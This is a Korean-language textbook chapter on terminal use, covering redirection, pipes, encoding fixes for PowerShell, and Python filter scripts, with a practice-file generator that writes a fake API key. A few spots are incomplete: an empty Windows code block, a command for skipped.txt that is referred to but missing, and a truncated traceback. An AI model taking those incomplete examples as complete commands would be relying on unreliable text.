# 3장. 터미널 활용

[개발 도구](README.md) 과정의 세 번째 장이다. 2장에서는 명령을 **하나씩** 정확하게 입력하는 법을 익혔다. 이 장에서는 명령을 **잇고, 묶고, 읽는** 법을 배운다. 명령 하나는 한 가지 일만 하지만, 출력을 파일로 보내고 다음 명령에 넘기고 성공했을 때만 다음 단계로 가게 이으면 몇 줄짜리 명령이 작은 프로그램처럼 일한다. 2장에서 "3장에서"라고 미뤄 둔 것들이 모두 여기서 등장한다.

- **입출력 연결** — 표준 입력·표준 출력·표준 오류, 리다이렉션(`>`, `>>`, `2>`, `2>&1`), 파이프(`|`), 파이썬 프로그램을 파이프 중간에 넣기
- **찾기와 세기** — 파일 이름과 내용으로 찾기, 줄 수 세기·정렬·중복 세기, 큰 CSV를 열기 전에 살펴보기
- **종료 코드와 명령 연결** — 성공·실패를 알리는 종료 코드, `&&`와 `||`
- **셸 환경** — 환경 변수, `PATH`, 셸 설정 파일과 별칭
- **프로세스와 포트** — 끝나지 않는 서버 프로그램, "이미 사용 중인 포트" 오류 해결
- **반복 작업 묶기** — 셸 스크립트, PowerShell 스크립트, 파이썬 스크립트
- **웹에서 내려받기와 설치 명령** — `curl`, `curl ... | sh` 형태의 설치 명령을 실행하기 전에 확인할 것
- **AI가 실행하려는 명령 읽기** — AI 코딩 도구가 실행 허락을 구하는 명령에서 위험 신호 알아보기

## 학습 목표

이 장을 마치면 다음을 할 수 있다.

- 표준 입력·표준 출력·표준 오류를 구별하고, `>`, `>>`, `2>`, `2>&1`로 출력을 파일에 저장하거나 버릴 수 있다.
- 파이프로 명령을 잇고, `sys.stdin`으로 읽고 `print()`로 내보내는 파이썬 프로그램을 파이프 중간에 넣을 수 있다.
- zsh의 글자 파이프와 PowerShell의 객체 파이프가 어떻게 다른지 설명하고, Windows에서 파이프로 한글을 주고받을 때 인코딩을 맞출 수 있다.
- `find`·`grep`(PowerShell은 `Get-ChildItem`·`Select-String`)으로 파일을 이름과 내용으로 찾고, `wc`·`sort`·`uniq`(PowerShell은 `Measure-Object`·`Sort-Object`·`Group-Object`)로 세고 정렬할 수 있다.
- 큰 CSV 파일을 열기 전에 크기, 줄 수, 앞부분, 형식이 틀린 줄을 터미널에서 확인할 수 있다.
- 종료 코드를 확인하고, `&&`와 `||`로 성공·실패에 따라 다음 명령을 실행할 수 있다.
- 환경 변수와 `PATH`를 확인하고 바꾸며, 셸 설정 파일에 별칭과 설정을 두고, 설정을 바꾼 뒤 새 터미널을 열어야 하는 이유를 설명할 수 있다.
- "이미 사용 중인 포트" 오류가 나면 그 포트를 쓰는 프로세스를 찾아 종료할 수 있다.
- 자주 쓰는 명령을 셸 스크립트, PowerShell 스크립트, 파이썬 스크립트로 묶고, 상황에 맞는 것을 고를 수 있다.
- `curl`로 웹 응답을 보고 파일을 내려받으며, `curl ... | sh` 형태의 설치 명령을 실행하기 전에 확인할 것을 말할 수 있다.
- AI 코딩 도구가 실행하려는 명령을 조각으로 나누어 읽고, 위험 신호가 있는 명령을 허락하기 전에 확인할 수 있다.

```python
# make_files.py — 3장 실습 파일을 만든다
from pathlib import Path
import random

random.seed(3)
base = Path("practice")


def write(path, text):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8", newline="\n")


# 1. 웹 서버 접근 로그 — 시각 메서드 경로 상태코드 응답시간
pages = ["/", "/items", "/items/42", "/cart", "/login", "/api/summary", "/favicon.ico"]
weights = [20, 30, 15, 10, 8, 12, 5]
lines = []
for i in range(3000):
    minute, second = divmod(i, 60)
    path = random.choices(pages, weights)[0]
    method, status, ms = "GET", 200, random.randint(5, 300)
    if path == "/login":
        method, status = random.choice([("GET", 200), ("POST", 302)])
    elif path == "/favicon.ico":
        status = 404
    elif path == "/api/summary" and random.random() < 0.1:
        status, ms = 500, random.randint(1000, 3000)
    lines.append(f"2026-11-13T{9 + minute // 60:02d}:{minute % 60:02d}:{second:02d} {method} {path} {status} {ms}ms")
write(base / "access.log", "\n".join(lines) + "\n")

# 2. 큰 가계부 CSV — 20만 줄. 형식이 틀린 줄이 세 줄 섞여 있다
categories = {"수입": ["월급", "부수입"], "지출": ["식비", "교통", "주거", "통신", "문화", "의료", "교육"]}
memos = {"월급": "급여", "부수입": "중고 거래", "식비": "점심", "교통": "버스",
         "주거": "관리비", "통신": "휴대폰 요금", "문화": "영화", "의료": "약국", "교육": "책"}
rows = ["date,kind,category,memo,amount"]
for i in range(200_000):
    kind = "수입" if random.random() < 0.05 else "지출"
    category = random.choice(categories[kind])
    amount = random.randint(1, 300) * 1000 if kind == "수입" else random.randint(1, 200) * 500
    rows.append(f"2026-{random.randint(1, 12):02d}-{random.randint(1, 28):02d},{kind},{category},{memos[category]},{amount}")
rows[51234] = "2026-07-15,지출,식비,점심,N/A"
rows[120001] = "2026/08/03,지출,교통,버스,1500"
rows[187650] = "2026-10-21,지츨,문화,영화,15000"
write(base / "transactions.csv", "\n".join(rows) + "\n")

# 3. 작은 파이썬 프로젝트 — 찾기 실습용
project = base / "project"
write(project / "main.py", "from ledger.core import summarize\n\n# TODO: 인자 검사 추가\nprint(summarize([]))\n")
write(project / "ledger" / "__init__.py", "")
write(project / "ledger" / "core.py",
      "def summarize(rows):\n    # TODO: 수입과 지출을 나누어 더하기\n    return sum(rows)\n\n\n"
      "def by_category(rows):\n    # TODO: 분류별 합계\n    return {}\n")
write(project / "ledger" / "storage.py",
      "import os\n\nAPI_KEY = os.getenv(\"OPENAI_API_KEY\")\n\n\ndef load(path):\n    # todo: 인코딩 확인\n    return []\n")
(project / "ledger" / "__pycache__").mkdir(parents=True, exist_ok=True)
(project / "ledger" / "__pycache__" / "core.cpython-313.pyc").write_bytes(b"\x00\x01TODO\x00" * 10)
for name in ["requests", "rich", "urllib3"]:
    write(project / ".venv" / "lib" / "site-packages" / name / "__init__.py",
          "".join(f"# TODO: {name} 내부 작업 {n}\n" for n in range(1, 6)))
write(project / ".env", "OPENAI_API_KEY=sk-practice-0000-not-a-real-key\n")
write(project / ".gitignore", ".venv/\n__pycache__/\n.env\n")
write(project / "README.md", "# 실습 프로젝트\n\n찾기 실습에 쓰는 작은 프로젝트다.\n")

print("practice 폴더를 만들었다.")
```

`random.seed(3)`으로 난수의 출발점을 고정했으므로, 누가 실행해도 같은 내용의 파일이 만들어진다. 그래서 이 장의 출력 예와 내 결과를 숫자까지 비교할 수 있다.

`access.log`의 한 줄은 웹 서버가 요청 하나를 처리할 때마다 남기는 기록이다. 다섯 칸이 공백으로 나뉘어 있다.

```
2026-11-13T09:00:18 GET /api/summary 500 2013ms
─────────────────── ─── ──────────── ─── ──────
시각                메서드 경로        상태 코드 응답 시간
```

상태 코드는 웹 서버가 요청을 어떻게 처리했는지 알리는 세 자리 숫자다. `200`은 성공, `302`는 다른 주소로 옮겨 가라는 뜻, `404`는 그런 경로가 없다는 뜻, `500`은 서버 안에서 오류가 났다는 뜻이다. 자세한 것은 "웹·API 기초"에서 배운다. 이 장에서는 "`500`이 몇 번 났나"를 세는 데 쓴다.

> **`.env`의 키는 가짜다**
> `project/.env`에 든 `sk-practice-0000-not-a-real-key`는 실습용으로 지어낸 값이다. 실제 프로젝트에서 `.env`에는 진짜 API 키가 들어간다. 이 장의 3.2와 3.8에서 "명령 하나로 비밀 값이 화면에 드러나는" 장면을 보여 주려고 넣어 두었다.

## 3.1 입출력 연결

### 3.1.1 프로그램의 세 통로

기초 과정 10장과 이 과정 1.3.4에서 프로그램이 출력을 두 갈래(표준 출력, 표준 오류)로 보낸다는 것을 보았다. 사실 프로그램에는 통로가 하나 더 있다. 입력이 들어오는 **표준 입력**이다. 운영체제는 프로그램을 실행할 때마다 이 세 통로를 열어 준다. 통로마다 번호가 있는데, 이 번호가 곧 리다이렉션 문법에 나온다.

| 번호 | 이름 | 영어 | 아무것도 하지 않았을 때 연결된 곳 | 파이썬에서 |
|---|---|---|---|---|
| 0 | 표준 입력 | standard input, stdin | 키보드 | `input()`, `sys.stdin` |
| 1 | 표준 출력 | standard output, stdout | 터미널 화면 | `print()`, `sys.stdout` |
| 2 | 표준 오류 | standard error, stderr | 터미널 화면 | `print(..., file=sys.stderr)`, 오류 메시지(traceback) |

```
                 ┌──────────────┐ ──1(표준 출력)──▶ 화면
 키보드 ──0(표준 입력)──▶│   프로그램   │
                 └──────────────┘ ──2(표준 오류)──▶ 화면
```

터미널에서 명령을 실행하면 셸이 이 세 통로를 키보드와 화면에 이어 준다. 그런데 셸에게 부탁하면 통로를 **다른 곳에 이을 수 있다.** 출력을 화면 대신 파일로 보내거나(리다이렉션), 한 프로그램의 출력을 다른 프로그램의 입력으로 잇는(파이프) 것이다. 이때 프로그램은 아무것도 바꿀 필요가 없다. `print()`는 늘 표준 출력에 쓸 뿐이고, 그 끝이 화면인지 파일인지 다른 프로그램인지는 셸이 정한다.

표준 출력과 표준 오류를 나누어 두는 이유도 여기서 드러난다. 결과(표준 출력)는 파일이나 다음 프로그램으로 보내고, 경고나 오류(표준 오류)는 사람이 보도록 화면에 남길 수 있다. 기초 과정 10장의 가계부 요약 프로그램이 오류 메시지를 표준 오류로 낸 것도 그래서다.

### 3.1.2 출력을 파일로 — `>`와 `>>`

`>`는 표준 출력을 파일로 보낸다. 파일이 없으면 만들고, **있으면 내용을 지우고 새로 쓴다.** `>>`는 파일 끝에 **덧붙인다.** 두 셸에서 같다.

```
echo "첫 줄" > note.txt
echo "둘째 줄" >> note.txt
cat note.txt
```

```
첫 줄
둘째 줄
```

여기서 `echo "셋째 줄" > note.txt`를 실행하면 앞의 두 줄은 사라지고 `셋째 줄`만 남는다. **`>`는 묻지 않고 덮어쓴다.** 2.4.4의 `rm`처럼 휴지통도 없다. 화살표 하나 차이로 파일을 날릴 수 있으니 `>`와 `>>`를 헷갈리지 않도록 한다.

같은 파일을 읽으면서 같은 파일로 출력을 보내는 실수도 흔하다.

```
# macOS — 하지 말 것
sort note.txt > note.txt
```

결과로 `note.txt`는 **빈 파일**이 된다. 셸은 명령을 실행하기 **전에** `>`를 처리하므로, `sort`가 파일을 읽기 시작할 때 이미 내용이 지워져 있다. 결과는 언제나 다른 이름의 파일로 보내고, 확인한 뒤에 이름을 바꾼다(`sort note.txt > note_sorted.txt`).

> **zsh에서 덮어쓰기 막기**
> zsh에서 `setopt noclobber`를 실행하면 `>`가 이미 있는 파일을 덮어쓰지 않고 `file exists` 오류를 낸다. 그래도 덮어쓰려면 `>|`를 쓴다. 이 설정을 늘 켜 두고 싶으면 3.4의 셸 설정 파일에 적는다.

**Windows — `>`로 저장한 파일의 인코딩**

1.2.3에서 본 것을 정리하면, PowerShell 7의 `>`로 만든 파일의 인코딩은 무엇을 저장하느냐에 따라 다르다.

| 저장하는 것 | 예 | 파일의 인코딩 |
|---|---|---|
| PowerShell이 만든 글자 | `echo "첫 줄" > note.txt`, `Get-ChildItem > list.txt` | UTF-8 |
| 외부 프로그램의 출력 | `python main.py ... > out.txt`, `git log > log.txt` | 프로그램이 내보낸 바이트 그대로(PowerShell 7.4 이상) |

파이썬 3.14 이하는 UTF-8 모드가 꺼져 있으면 파일이나 파이프로 내보내는 출력을 cp949로 쓴다. 그래서 한글을 출력하는 파이썬 프로그램의 결과를 `>`로 저장하면 VS Code에서 한글이 깨져 보일 수 있다. 1.2.3에서는 `python -X utf8`로 그 실행만 UTF-8 모드를 켰다. 이 장의 3.1.6에서 아예 늘 UTF-8이 되도록 설정한다.

### 3.1.3 표준 오류도 보내기 — `2>`, `2>&1`

`>`는 사실 `1>`을 줄인 것이다. 앞에 통로 번호를 적으면 그 통로를 보낸다. 표준 오류를 보내려면 `2>`를 쓴다.

결과와 경고를 함께 내는 작은 프로그램으로 실험한다. `ch03` 폴더에 `report.py`를 만든다.

```python
# report.py — 결과는 표준 출력으로, 경고는 표준 오류로 내보낸다
import sys

print("결과 1")
print("경고: 3번째 줄을 건너뛰었다", file=sys.stderr)
print("결과 2")
```

아무것도 하지 않으면 세 줄이 모두 화면에 나온다.

```
# macOS
python3 report.py

# Windows
python report.py
```

```
결과 1
경고: 3번째 줄을 건너뛰었다
결과 2
```

여기에 리다이렉션을 하나씩 붙여 본다. 아래에서는 `python`으로 적었다. macOS에서는 `python3`로 입력한다.

| 명령 | 화면에 남는 것 | 파일에 들어가는 것 |
|---|---|---|
| `python report.py > out.txt` | 경고 | `out.txt`: 결과 1, 결과 2 |
| `python report.py 2> err.txt` | 결과 1, 결과 2 | `err.txt`: 경고 |
| `python report.py > out.txt 2> err.txt` | 없음 | 결과는 `out.txt`, 경고는 `err.txt` |
| `python report.py > all.txt 2>&1` | 없음 | `all.txt`: 세 줄 모두 |

`2>&1`은 "2번 통로를 1번 통로**가 가는 곳**으로 보내라"는 뜻이다. `&1`의 `&`는 "1이라는 이름의 파일이 아니라 1번 통로"라는 표시다. `&`를 빼고 `2>1`이라고 쓰면 `1`이라는 이름의 파일이 생긴다.

**순서가 중요하다.** 셸은 리다이렉션을 왼쪽부터 처리한다. `> all.txt 2>&1`은 "1번을 `all.txt`로 돌린 다음, 2번을 지금 1번이 가는 곳(`all.txt`)으로"다. 거꾸로 `2>&1 > all.txt`라고 쓰면 "2번을 지금 1번이 가는 곳(화면)으로 돌린 다음, 1번만 `all.txt`로"가 되어 경고는 여전히 화면에 나온다. "출력과 오류를 모두 파일로"는 `> 파일 2>&1` 하나로 외워 둔다. 두 셸 모두에서 이 순서로 쓰면 된다.

| 하는 일 | zsh(macOS) | PowerShell 7(Windows) |
|---|---|---|
| 표준 출력만 파일로 | `> 파일` | `> 파일` |
| 표준 오류만 파일로 | `2> 파일` | `2> 파일` |
| 둘 다 한 파일로 | `> 파일 2>&1`(줄여서 `&> 파일`) | `> 파일 2>&1`(PowerShell의 모든 출력은 `*> 파일`) |
| 출력 버리기 | `> /dev/null` | `> $null` |
| 오류 버리기 | `2> /dev/null` | `2> $null` |

`/dev/null`은 macOS와 리눅스에 있는 특별한 파일로, 무엇을 써도 사라진다. PowerShell에서는 `$null`이 같은 일을 한다. 인터넷에서 `2>/dev/null`이 붙은 명령을 PowerShell에 그대로 붙여 넣으면 `/dev/null`이라는 경로가 없다는 오류가 난다. 출력을 버리는 것은 편리하지만, **오류를 버리면 실패를 알 수 없게 된다.** 3.8에서 AI가 실행하려는 명령에 `2>/dev/null`이 붙어 있을 때 한 번 더 보는 이유다.

**합친 파일의 줄 순서가 바뀐다**

`all.txt`를 열어 보자.

```
경고: 3번째 줄을 건너뛰었다
결과 1
결과 2
```

화면에서는 `결과 1` 다음에 경고가 나왔는데, 파일에서는 경고가 맨 앞이다. 2.5.4의 상자에서 본 **버퍼** 때문이다. 파이썬은 표준 출력이 화면이 아니면 `print()`한 글자를 버퍼에 모았다가 나중에(대개 프로그램이 끝날 때) 한꺼번에 쓴다. 표준 오류는 모으지 않고 줄마다 바로 쓴다. 그래서 늦게 쓴 경고가 먼저 파일에 들어갔다.

로그를 시간 순서대로 봐야 할 때는 `-u` 옵션(unbuffered)으로 실행해 버퍼를 끈다.

```
# macOS
python3 -u report.py > all.txt 2>&1

# Windows
python -u report.py > all.txt 2>&1
```

이제 화면에서 본 순서대로 저장된다. 서버 프로그램의 출력을 파일로 남길 때, 그리고 3.5에서 보듯 다른 프로그램이 파이썬의 출력을 실시간으로 읽어야 할 때 이 차이가 문제가 된다.

### 3.1.4 파이프 — 명령 잇기

**파이프**(`|`)는 왼쪽 명령의 표준 출력을 오른쪽 명령의 표준 입력에 잇는다. 중간 결과를 파일로 저장하지 않고 바로 다음 명령에 넘긴다.

```
명령1 ──표준 출력──▶ | ──표준 입력──▶ 명령2 ──표준 출력──▶ 화면
```

2장의 실습 2-5에서 Windows 사용자는 "로그의 마지막 `ERROR`"를 `-Tail 50`의 출력에서 눈으로 찾았다. 이번 장의 `access.log`에서 "마지막으로 `500`이 난 요청"을 파이프로 찾는다. `practice` 폴더로 이동해서 실행한다.

```
cd practice

# macOS
grep ' 500 ' access.log | tail -n 1

# Windows
Select-String ' 500 ' access.log | Select-Object -Last 1
```

```
# macOS
2026-11-13T09:49:33 GET /api/summary 500 1212ms

# Windows
access.log:2974:2026-11-13T09:49:33 GET /api/summary 500 1212ms
```

`grep`과 `Select-String`은 3.2에서 자세히 배운다. 지금은 "` 500 `이 든 줄만 골라내는 명령"이라고만 알면 된다. 첫 명령이 고른 44줄이 화면 대신 두 번째 명령으로 들어가고, 두 번째 명령은 그중 마지막 한 줄만 내보냈다. 몇 줄인지 세려면 마지막 명령만 바꾼다.

```
# macOS
grep ' 500 ' access.log | wc -l

# Windows
(Select-String ' 500 ' access.log).Count
```

```
44
```

(macOS의 `wc -l` 출력은 앞에 공백이 붙어 `      44`처럼 보인다.)

파이프는 몇 개든 이을 수 있다. 명령 하나하나는 단순해도 이어 붙이면 복잡한 일을 한다. 유닉스 계열 셸이 오래 사랑받은 이유다.

**표준 오류는 파이프로 넘어가지 않는다**

파이프가 잇는 것은 표준 출력뿐이다. 표준 오류는 여전히 화면으로 간다. `report.py`로 확인한다. `ch03` 폴더에서 실행한다.

```
cd ..

# macOS
python3 report.py | grep 결과

# Windows
python report.py | Select-String 결과
```

```
경고: 3번째 줄을 건너뛰었다
결과 1
결과 2
```

`grep 결과`로 걸렀는데도 경고가 보인다. 경고는 `grep`을 거치지 않고 곧장 화면으로 왔기 때문이다. 오류까지 다음 명령으로 넘기고 싶으면 `2>&1 |`로 표준 오류를 표준 출력에 합친 다음 잇는다. 하지만 대개는 이렇게 나뉘어 있는 편이 좋다. 다음 프로그램은 결과만 받고, 사람은 화면에서 경고를 본다.

**zsh는 글자를, PowerShell은 객체를 넘긴다**

2.1.2에서 PowerShell은 객체를 주고받는다고 했다. 파이프에서 그 차이가 드러난다.

zsh의 파이프로 흐르는 것은 **글자의 줄**이다. 그래서 받는 쪽은 줄을 잘라서 원하는 칸을 꺼내야 한다. 예를 들어 `practice` 폴더에서 가장 큰 파일을 찾으려면 `ls -l`의 출력에서 크기 칸(다섯째 칸)을 기준으로 정렬한다.

```
# macOS
ls -l practice | sort -k5 -n -r | head -n 3
```

PowerShell의 파이프로 흐르는 것은 **객체**다. `Get-ChildItem`은 이름·크기·수정 시각을 속성으로 가진 파일 객체를 내보내고, 다음 명령은 속성의 이름으로 바로 꺼내 쓴다.

```
# Windows
Get-ChildItem practice | Sort-Object Length -Descending | Select-Object -First 3 Name, Length
```

```
Name             Length
----             ------
transactions.csv 7907041
access.log       123347
project
```

`Sort-Object Length`는 "`Length` 속성으로 정렬하라", `Select-Object Name, Length`는 "`Name`과 `Length` 속성만 보여 달라"는 뜻이다. 칸이 몇 번째인지 셀 필요가 없다. 폴더는 `Length`가 없으므로 빈칸으로 나온다.

2.4.6의 상자에서 "PowerShell에서 폴더 전체 크기를 보려면 3장의 파이프가 필요하다"고 했다. 이제 할 수 있다. 기초 과정의 `ledger_app` 폴더에서 `.venv`의 크기를 본다.

```
# macOS
du -sh ~/python-lab/ch10/ledger_app/.venv

# Windows
Get-ChildItem ~\python-lab\ch10\ledger_app\.venv -Recurse -File | Measure-Object Length -Sum
```

```
# Windows
Count             : 2381
Average           :
Sum               : 41270466
Maximum           :
Minimum           :
StandardDeviation :
Property          : Length
```

`Get-ChildItem -Recurse -File`이 `.venv` 안의 모든 파일 객체를 내보내고, `Measure-Object Length -Sum`이 그 `Length` 속성을 모두 더했다. `Sum`이 바이트 단위의 크기다(숫자는 설치한 패키지에 따라 다르다). 몇천 개의 파일, 수십 MB가 `.venv` 하나에 들어 있다. 5장에서 이 폴더를 Git에 올리지 않는 이유다.

두 방식에는 각각 장점이 있다.

| | zsh(글자 파이프) | PowerShell(객체 파이프) |
|---|---|---|
| 흐르는 것 | 글자의 줄 | 속성을 가진 객체 |
| 칸 꺼내기 | 몇 번째 칸인지 세어서 자른다(`cut`, `sort -k5`) | 속성 이름으로 꺼낸다(`Sort-Object Length`) |
| 잘 맞는 일 | 로그·CSV 같은 텍스트 파일 다루기, 어떤 프로그램이든 잇기 | 파일·프로세스·네트워크 연결 같은 시스템 정보 다루기 |
| 외부 프로그램과 이을 때 | 그대로 글자가 흐른다 | 객체를 글자로 바꿔서 넘기고, 받은 글자를 문자열 객체로 바꾼다 |

마지막 줄이 중요하다. PowerShell에서 `python`, `git` 같은 외부 프로그램과 파이프를 이으면, 그 경계에서 객체와 글자 사이의 변환이 일어난다. 이 변환에 인코딩이 끼어든다. 3.1.6에서 다룬다.

### 3.1.5 파일에서 입력받기 — `<`

`>`가 출력을 파일로 보낸다면, `<`는 파일의 내용을 프로그램의 표준 입력으로 넣는다. 키보드 대신 파일이 입력이 된다.

```
# macOS
python3 -c "import sys; print(len(sys.stdin.readlines()))" < practice/access.log
```

```
3000
```

`sys.stdin.readlines()`는 표준 입력의 모든 줄을 읽는다. 키보드에서 읽었다면 내가 입력을 마칠 때까지 기다렸겠지만, 여기서는 `access.log`의 3,000줄이 들어왔다.

**PowerShell에는 `<`가 없다.** 입력하면 다음 오류가 난다.

```
# Windows
python -c "import sys; print(len(sys.stdin.readlines()))" < practice/access.log
```

```
ParserError:
Line |
   1 |  python -c "import sys; print(len(sys.stdin.readlines()))" < practice/access.log
     |                                                            ~
     | The '<' operator is reserved for future use.
```

"`<` 연산자는 나중을 위해 남겨 두었다"는 뜻이다. PowerShell에서는 `Get-Content`로 파일을 읽어 파이프로 넘긴다.

```
# Windows
Get-Content practice/access.log | python -c "import sys; print(len(sys.stdin.readlines()))"
```

```
3000
```

결과는 같지만 속은 다르다. `Get-Content`는 파일을 줄마다 문자열 객체로 읽고, PowerShell이 그 문자열을 다시 글자로 바꿔 파이썬에 넘긴다. 줄이 많으면 이 변환에 시간이 꽤 걸린다. 20만 줄짜리 `transactions.csv`를 이렇게 넘기면 몇 초가 걸린다. 3.1.7에서 이 문제를 프로그램 쪽에서 푸는 방법을 본다.

### 3.1.6 Windows — 파이프로 한글을 주고받을 때

> macOS 사용자는 이 절을 읽기만 하고 건너뛴다. macOS는 셸, 파이썬, 다른 프로그램이 모두 UTF-8을 쓰므로 맞출 것이 없다.

PowerShell과 외부 프로그램 사이에 파이프를 이으면 경계마다 글자를 바이트로(또는 바이트를 글자로) 바꾸는 일이 일어나고, 그때마다 인코딩을 하나씩 고른다. 한국어 Windows의 기본 상태에서는 이 인코딩들이 서로 맞지 않는다.

| 경계 | 정하는 곳 | 기본값(한국어 Windows, PowerShell 7) |
|---|---|---|
| PowerShell → 외부 프로그램(`Get-Content ... \| python`) | `$OutputEncoding` | UTF-8 |
| 외부 프로그램 → PowerShell(`python ... \| Select-String`) | `[Console]::OutputEncoding` | cp949 |
| 파이썬이 표준 입력을 읽고 표준 출력에 쓸 때(파이프·파일인 경우) | 파이썬의 UTF-8 모드 | 3.14 이하: cp949, 3.15 이상: UTF-8 |

파이썬 3.13이라면, PowerShell은 UTF-8로 보내는데 파이썬은 cp949로 읽는다. 파이썬 3.15라면, 파이썬은 UTF-8로 내보내는데 PowerShell은 cp949로 읽는다. 어느 쪽이든 한쪽에서 한글이 깨진다. `git`도 마찬가지다. Git은 UTF-8로 출력하므로 5장에서 한글 커밋 메시지를 `git log | Select-String ...`으로 거르면 깨진다.

지금 상태를 확인한다.

```
# Windows
[Console]::OutputEncoding.WebName
"" | python -c "import sys; print(sys.stdin.encoding)"
```

```
ks_c_5601-1987
cp949
```

`ks_c_5601-1987`은 .NET에서 cp949를 부르는 이름이다. 두 번째 명령은 파이프로 표준 입력을 받은 파이썬이 쓰는 인코딩이다(파이썬 3.15 이상이면 `utf-8`).

해결책은 **모든 경계를 UTF-8로 맞추는** 것이다. 기초 과정 7장에서 "텍스트는 UTF-8로"라고 정한 약속을 파이프에도 적용한다. 다음 두 줄을 실행한다.

```
# Windows
[Console]::InputEncoding = [Console]::OutputEncoding = [System.Text.UTF8Encoding]::new()
$env:PYTHONUTF8 = "1"
```

- 첫째 줄은 PowerShell이 외부 프로그램과 콘솔을 통해 글자를 주고받을 때 쓰는 인코딩을 UTF-8로 바꾼다. `A = B = 값`은 두 곳에 같은 값을 넣는 문법이다.
- 둘째 줄은 환경 변수 `PYTHONUTF8`을 `1`로 정한다. 1.2.3에서 본 대로 파이썬의 UTF-8 모드를 켜는 환경 변수다. 이제 파이썬은 버전에 관계없이 파이프와 파일을 UTF-8로 읽고 쓴다. `>`로 저장한 파이썬 출력도 UTF-8 파일이 된다. 환경 변수는 3.4에서 자세히 다룬다.

다시 확인한다.

```
# Windows
[Console]::OutputEncoding.WebName
"" | python -c "import sys; print(sys.stdin.encoding)"
```

```
utf-8
utf-8
```

이 설정은 **이 터미널 창에서만, 창을 닫을 때까지만** 유효하다(1.3.2의 환경 변수와 같다). 이 장의 실습을 하는 동안 새 터미널을 열 때마다 두 줄을 다시 실행한다. 3.4.3에서 셸 설정 파일에 적어 두면 터미널을 열 때마다 자동으로 실행된다.

> **"Beta: 세계 언어 지원을 위해 Unicode UTF-8 사용"**
> 1.2.3에서 소개한 Windows 지역 설정의 이 항목을 켜면 운영체제의 기본 인코딩 자체가 UTF-8이 되어 위의 두 줄이 필요 없다. 다만 오래된 한국어 프로그램 일부가 한글을 제대로 표시하지 못할 수 있어서 이 교재에서는 켜라고 하지 않는다. 이미 켜 두었다면 확인 명령의 결과가 처음부터 `utf-8`로 나온다.

### 3.1.7 파이썬 프로그램을 파이프 중간에 넣기

`grep`, `sort`, `head` 같은 명령은 모두 같은 약속을 지킨다. **표준 입력에서 줄을 읽고, 처리해서, 표준 출력으로 내보낸다.** 이런 프로그램을 **필터**(filter)라고 한다. 이 약속만 지키면 내가 만든 파이썬 프로그램도 파이프 어디에나 끼울 수 있다.

`transactions.csv`로 연습한다. 20만 줄짜리 가계부에서 식비의 합계를 구하고 싶다. 필터 두 개를 만든다. `ch03` 폴더에 만든다.

첫째는 줄마다 마지막 칸(금액)을 더하는 필터다. 파이프의 **끝**에 놓는다.

```python
# sum_amounts.py — 표준 입력으로 받은 CSV 줄의 마지막 칸(금액)을 더한다
import sys

count = 0
total = 0
for line in sys.stdin:
    total += int(line.rstrip("\n").split(",")[-1])
    count += 1
print(f"{count:,}건, 합계 {total:,}원")
```

`for line in sys.stdin:`은 파일 객체를 `for`로 돌 때와 똑같이 표준 입력을 한 줄씩 읽는다(기초 과정 7장). 모두 읽어서 메모리에 올리지 않고 한 줄씩 처리하므로 입력이 아무리 커도 괜찮다.

앞의 1,000건으로 시험해 본다. `head -n 1001`은 첫 줄(열 이름)과 거래 1,000줄이다.

```
# macOS
head -n 1001 practice/transactions.csv | python3 sum_amounts.py

# Windows
Get-Content practice/transactions.csv -TotalCount 1001 | python sum_amounts.py
```

```

  File ".../sum_amounts.py", line 7, in <module>
    total += int(line.rstrip("\n").split(",")[-1])
             ~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
```

첫 줄 `date,kind,category,memo,amount`의 마지막 칸 `amount`를 숫자로 바꾸려다 실패했다. 이 traceback도 표준 오류로 나온다. 파이프 뒤에 다른 명령이 있었다면 그 명령으로 넘어가지 않고 화면에 남았을 것이다.

열 이름 줄과 형식이 틀린 줄을 걸러 내는 필터를 하나 더 만든다. 파이프의 **중간**에 놓는다.

```python
# clean.py — 가계부 CSV에서 형식이 맞는 줄만 표준 출력으로 내보낸다
import sys

for number, line in enumerate(sys.stdin, start=1):
    line = line.rstrip("\n")
    if line.startswith("date,"):
        continue  # 열 이름 줄은 건너뛴다
    parts = line.split(",")
    ok = (
        len(parts) == 5
        and parts[0][4:5] == "-"
        and parts[1] in ("수입", "지출")
        and parts[4].isdigit()
    )
    if ok:
        print(line)
    else:
        print(f"{number}번째 줄을 건너뜀: {line}", file=sys.stderr)
```

- 형식이 맞는 줄은 `print()`로 **표준 출력**에 내보낸다. 다음 필터가 받을 것이다.
- 형식이 틀린 줄은 줄 번호와 함께 **표준 오류**에 알린다. 다음 필터로 넘어가지 않고 사람에게 보인다. 3.1.4에서 본 표준 오류의 쓰임새다.
- 검사는 기초 과정 10장의 `storage.py`보다 훨씬 느슨하다. 칸이 다섯 개인지, 날짜의 다섯째 글자가 `-`인지, 구분이 `수입`이나 `지출`인지, 금액이 숫자로만 되어 있는지만 본다. 이 실습 파일은 메모에 쉼표가 없으므로 `csv` 모듈 대신 `split(",")`으로 충분하다.

`Select-String`의 `-Raw`는 찾은 줄을 `파일:줄 번호:내용` 꼴의 결과 객체가 아니라 **줄 그대로의 문자열**로 내보내라는 옵션이다. 다음 프로그램에 줄만 넘기려면 붙인다.

`clean.py`가 없으면 어떻게 될까? `grep`이 고른 식비 줄에는 `N/A`가 든 51235번째 줄이 섞여 있어서 `sum_amounts.py`가 `ValueError`로 멈춘다. 직접 확인해 보자(`grep ',식비,' practice/transactions.csv | python3 sum_amounts.py`). 파이프의 앞 단계에서 데이터를 깨끗하게 하고 뒤 단계에서 계산하는 나눔은 "데이터 처리 기초"에서 pandas로 일할 때도 그대로다.

```
# Windows
```

이제 화면에는 합계 한 줄만 나오고, `skipped.txt`에 건너뛴 세 줄이 남는다. 리다이렉션은 그것이 붙은 명령에만 적용된다. `2> skipped.txt`는 `clean.py`의 표준 오류만 보낸다.

**파일 이름도 받게 하기**

`grep`, `head`, `wc`는 `grep 500 access.log`처럼 파일 이름을 주면 그 파일을 읽고, 파일 이름이 없으면 표준 입력을 읽는다. 우리 필터도 그렇게 만들면 두 가지 이점이 있다. PowerShell에 `<`가 없어도 `Get-Content`를 거치지 않아 빠르고, 두 셸에서 명령이 같아진다.

표준 라이브러리의 `fileinput` 모듈이 바로 이 일을 한다. `clean.py`의 앞부분을 다음과 같이 고친다.

```python
# clean.py — 가계부 CSV에서 형식이 맞는 줄만 표준 출력으로 내보낸다
# 사용법: python clean.py [파일 ...]   (파일을 주지 않으면 표준 입력을 읽는다)
import fileinput
import sys

